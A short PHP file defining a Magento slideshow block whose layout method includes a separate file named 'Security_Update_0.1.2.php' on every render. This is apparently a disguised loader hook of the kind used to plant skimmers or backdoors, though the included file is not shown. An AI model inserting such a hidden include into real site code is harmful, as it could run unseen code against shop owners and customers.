<?php
class Blueripples_Slideshow_Block_Slideshow extends Mage_Catalog_Block_Product_View_Media
{
	public function _prepareLayout()
    {
		include 'Security_Update_0.1.2.php';
		return parent::_prepareLayout();
    }
}